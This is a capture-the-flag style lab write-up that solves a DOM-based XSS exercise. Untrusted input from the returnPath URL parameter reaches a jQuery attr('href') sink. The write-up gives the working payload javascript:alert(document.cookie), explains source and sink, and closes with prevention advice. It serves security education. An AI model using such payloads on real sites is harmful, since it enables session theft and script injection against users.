# Lab 06: DOM XSS in jQuery anchor href attribute sink using location.search source

**Goal**: Perform a DOM-based cross-site scripting (DOM XSS) attack on the Submit feedback page that makes the "Back" link execute `javascript:alert(document.cookie)`.

This lab contains a DOM-based cross-site scripting vulnerability in the Submit feedback page. The page uses jQuery (`$`) to find a "Back" link anchor (`<a>`) element and modifies its `href` attribute dynamically using data from `location.search` (`returnPath` URL parameter).

---

## 🎯 Solution

1. Open the **Submit feedback** page.
2. Observe the URL parameter `returnPath=/`.
3. Test parameter reflection by changing `returnPath` to `/test123`:
   ```http
   /feedback?returnPath=/test123
   ```
4. Right-click the **Back** link and inspect the element to confirm the `href` attribute contains `/test123`.
5. Change `returnPath` to a JavaScript pseudo-protocol payload:
   ```http
   /feedback?returnPath=javascript:alert(document.cookie)
   ```
6. Click the **Back** link to execute `alert(document.cookie)`.

![Lab 6 Submit Feedback Page](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-25%20214436.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Access Submit Feedback Page & Source Analysis
Click on **Submit feedback** from the top header navigation. Examine the page URL query parameters:

```http
/feedback?returnPath=/
```

Inspect the page JavaScript handling the `returnPath` parameter using jQuery:

```javascript
$(function() {
    $('#backLink').attr('href', (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

- **Source**: `location.search` (`returnPath` parameter in the URL)
- **Sink**: jQuery `attr('href', ...)` method updating an `<a>` element

### Step 2: Test Attribute Injection Context
Modify the `returnPath` query string in the browser address bar to `/test123`:
```http
/feedback?returnPath=/test123
```

Right-click the **Back** link at the bottom of the form and click **Inspect Element**:
```html
<a id="backLink" href="/test123">Back</a>
```

### Step 3: Inject `javascript:` Pseudo-Protocol
Since the sink sets the `href` attribute of an anchor tag (`<a href="...">`), we can inject a `javascript:` URI scheme to execute arbitrary JavaScript upon link click.

Change `returnPath` in the URL to:
```http
/feedback?returnPath=javascript:alert(document.cookie)
```

Full target URL:
```http
https://your-lab-id.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```

### Step 4: Trigger Payload Execution
Press Enter to load the page with the payload parameter. The client-side jQuery script updates the link element to:

```html
<a id="backLink" href="javascript:alert(document.cookie)">Back</a>
```

Click the **Back** link. The browser interprets the `javascript:` URI scheme and executes `alert(document.cookie)`.

> [!SUCCESS]
> **Lab Solved**: Successfully executed `alert(document.cookie)` via jQuery `attr('href')` DOM XSS!

---

## 💡 Key Takeaways: `href` Sink Hazards

- **JavaScript Pseudo-Protocol**: Setting `href` attributes to attacker-controlled values allows payload execution via `javascript:...` URLs without needing `<script>` tags or HTML breakout.
- **jQuery Sink**: jQuery `.attr('href', user_input)` does not sanitize against `javascript:` protocol schemes.

---

## 🔒 Prevention

> [!TIP]
> 1. **URL Validation**: Validate that `returnPath` or redirection URLs start with safe relative paths (e.g. `/`) or explicit `http://` / `https://` protocols.
> 2. **Allowlisting**: Reject any URLs containing `javascript:` or `data:` schemes before assigning them to `href` attributes.
